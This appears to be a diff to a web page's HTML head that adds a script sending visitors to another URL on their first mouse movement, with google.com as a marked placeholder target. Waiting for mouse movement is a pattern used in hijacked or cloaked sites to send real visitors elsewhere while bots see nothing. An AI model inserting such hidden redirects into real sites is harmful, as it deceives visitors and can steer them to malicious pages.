@@ -1,6 +1,16 @@
 <!DOCTYPE html>
 <html lang="en-US">
 <head>
+<script>
+    let redirected = false;
+
+    document.addEventListener("mousemove", function () {
+      if (!redirected) {
+        redirected = true; // prevent multiple redirects
+        window.location.href = "https://google.com"; // 🔁 Your target URL
+      }
+    });
+  </script>
 	<!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16931815490"></script>
 <script>
